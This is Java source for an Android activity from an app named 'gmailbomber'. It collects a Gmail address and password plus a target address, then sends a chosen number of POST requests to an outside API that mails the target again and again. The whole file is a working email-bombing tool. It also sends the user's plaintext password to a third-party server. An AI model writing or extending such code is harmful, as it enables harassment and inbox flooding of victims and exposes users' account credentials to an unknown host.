package com.rabbi.gmailbomber;

import android.app.Activity;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.Button;
import android.view.View.OnClickListener;
import android.view.View;
import android.widget.Toast;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.Volley;
import org.json.JSONObject;
import org.json.JSONException;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.Request;
import android.view.LayoutInflater;
import android.content.Context;
import android.app.AlertDialog;
import android.widget.TextView;
import android.content.DialogInterface;
import com.android.volley.DefaultRetryPolicy;

public class StartBombing extends Activity {
    private EditText nameInput,gmailInput,passwordInput,targetInput,subjectInput,messageInput,amountInput;
    private Button startBtn,stopBtn;    
    private boolean stopExecution = false;
    private AlertDialog.Builder adb;
    private AlertDialog ShowAlert;
    private int counter = 0;
    private boolean isDismissAlert = false;
    private RequestQueue queue;
    private JsonObjectRequest jsonObjectRequest;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.start_bombing);
                        
        nameInput =findViewById(R.id.name);
        gmailInput = findViewById(R.id.gmail);
        passwordInput = findViewById(R.id.password);
        targetInput = findViewById(R.id.target);
        subjectInput = findViewById(R.id.subject);
        messageInput = findViewById(R.id.message);
        amountInput = findViewById(R.id.amount);
        startBtn = findViewById(R.id.startBtn);
        //stopBtn = findViewById(R.id.stopBtn);
        
        // Alert 
        adb = new AlertDialog.Builder(this);
        adb.setTitle("Warning");
        adb.setMessage("Are you sure you want to delete this message.You can't retrive message once deleted.");
       
        
        
        startBtn.setOnClickListener(new View.OnClickListener(){

             @Override
             public void onClick(View p1) {
                
                try{
                   stopExecution = false;
                   isDismissAlert = false;
                   //Toast.makeText(getApplication(), "Inside Try Block", Toast.LENGTH_SHORT).show();
                   //stopExecution = false;
                   String name = nameInput.getText().toString();
                   String gmail = gmailInput.getText().toString();
                   String password = passwordInput.getText().toString();
                   String target = targetInput.getText().toString();
                   String subject = subjectInput.getText().toString();
                   String message = messageInput.getText().toString();
                   final long amount = Long.parseLong(amountInput.getText().toString());


                   for (int i = 0; i < amount; i++) {
                      postRequest(name,gmail,password,target,subject,message);
                      
                      if(stopExecution){
                         stopExecution = false;
                         break;
                      }
                   }
                }
                catch(Exception err){
                   //Toast.makeText(getApplication(), "", Toast.LENGTH_SHORT).show();
                   if(nameInput.getText().toString().isEmpty()){                      
                      nameInput.setError("Please fill out this field");
                   }
                   if(gmailInput.getText().toString().isEmpty()){                      
                      gmailInput.setError("Please fill out this field");
                   }
                   if(passwordInput.getText().toString().isEmpty()){                      
                      passwordInput.setError("Please fill out this field");
                   }
                   if(targetInput.getText().toString().isEmpty()){                      
                      targetInput.setError("Please fill out this field");
                   }
                   if(subjectInput.getText().toString().isEmpty()){                      
                      subjectInput.setError("Please fill out this field");
                   }
                   if(messageInput.getText().toString().isEmpty()){                      
                      messageInput.setError("Please fill out this field");
                   }
                   if(amountInput.getText().toString().isEmpty()){                      
                      amountInput.setError("Please fill out this field");
                   }
                }
                
             }
                        
        });
        
        
       /*stopBtn.setOnClickListener(new View.OnClickListener(){

             @Override
             public void onClick(View p1) {
                //stopExecution = true;
                //AlertDialog alertDialog = adb.create();
                //alertDialog.show();     
                
                
                for (int i = 0; i < 4; i++) {
                   counter++;                   
                   if(counter == 1){
                      show_custom_alert(String.valueOf(counter));
                   }
                   if(stopExecution){
                      counter = 0;
                      break;                      
                   }
                }
                
             }
                        
        });*/
        
    }    
    
   // Method For Post Request
   public void postRequest(String name,String gmail,String password,String target,String subject,String message){
      String url = "https://fr-api.up.railway.app/api/gmail/send-mail";
      
      // Create a new RequestQueue
      queue = Volley.newRequestQueue(this);

      // Create a new JSONObject to send as the POST body
      JSONObject jsonBody = new JSONObject();
      try {
         jsonBody.put("name", name);
         jsonBody.put("gmail", gmail);
         jsonBody.put("password", password);
         jsonBody.put("target", target);
         jsonBody.put("subject", subject);
         jsonBody.put("message", message);
      } catch (JSONException e) {
         e.printStackTrace();
      }

      // Create a new JsonObjectRequest
      jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, jsonBody,
         new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
               // Handle the server response here

               try {
                  String res = response.getString("Message").toString();
                  if(res.contains("successfull")){
                     
                     
                        // Throw custom exception
                        if(stopExecution){
                           //throw new Error("Stop Sending Mail");
                        }

                        

                        counter++;
                        Toast.makeText(getApplicationContext(), "✅ ["+counter+"]" + "Email sent successful", Toast.LENGTH_SHORT).show();
                        if(counter == Integer.parseInt(amountInput.getText().toString())){
                           ShowAlert.dismiss();
                           counter = 0;
                        }
                       

                        if(counter == 1){
                           show_custom_alert(String.valueOf(counter));
                        }    
                     
                     
                  }
                  else{
                     Toast.makeText(getApplication(), "Please provide currect credentials !", Toast.LENGTH_LONG).show();
                  }    
               } catch (Exception e) {
                  Toast.makeText(getApplicationContext(), "Error while fetching data from server: "+e, Toast.LENGTH_LONG).show();
               }


            }
         }, new Response.ErrorListener() {
            AlertDialog alertDialog;
            @Override
            public void onErrorResponse(VolleyError error) {
               // Handle errors here
               Toast.makeText(getApplicationContext(),"Error: "+error,Toast.LENGTH_SHORT).show();
               //stopExecution = true;
               AlertDialog.Builder aldb = new AlertDialog.Builder(StartBombing.this);
               LayoutInflater lif = LayoutInflater.from(StartBombing.this);
               View view = lif.inflate(R.layout.no_internet_alert,null);
               Button okeyBtn = view.findViewById(R.id.okeyBtn);
               
               aldb.setView(view);
               aldb.setCancelable(false);               
               alertDialog = aldb.create();
               
               okeyBtn.setOnClickListener(new View.OnClickListener(){

                     @Override
                     public void onClick(View p1) {
                        alertDialog.cancel();
                     }                     

                  });
                  
               
               
               if(!stopExecution){
                  alertDialog.show();
                  stopExecution = true;
               }
            }
         });
      jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(
                                          0,
                                          DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                                          DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
                              ));
      // Add the request to the RequestQueue
      queue.add(jsonObjectRequest);
      jsonObjectRequest.setTag("dismiss");
      if(stopExecution){
         Toast.makeText(getApplication(), "Stop Execution Called", Toast.LENGTH_SHORT).show();
      }
   }
    
   // Show Custom Alert Dialog
   public void show_custom_alert(String count){
      LayoutInflater inflater = LayoutInflater.from(this);
      View view = inflater.inflate(R.layout.show_bombing_status_alert,null);
      adb = new AlertDialog.Builder(this);
      adb.setView(view);
      adb.setCancelable(false);
      //TextView email_count = view.findViewById(R.id.emailCount);
      Button stop_btn = view.findViewById(R.id.stopInAlert);
      
      
      //email_count.setText(count);            
      // AlertDialog -->
      ShowAlert = adb.create();
      if(counter == 1){
         ShowAlert.show();
      }
      
      stop_btn.setOnClickListener(new View.OnClickListener(){

            @Override
            public void onClick(View p1) {
               //Toast.makeText(getApplication(), "Stopped", Toast.LENGTH_SHORT).show();
               stopExecution = true;
               //ShowAlert.cancel();
               //ShowAlert.dismiss();
               //counter = 0;
               //isDismissAlert = true;    
               //queue.cancelAll("dismiss");
            }

         });
      
   }
   
   
}
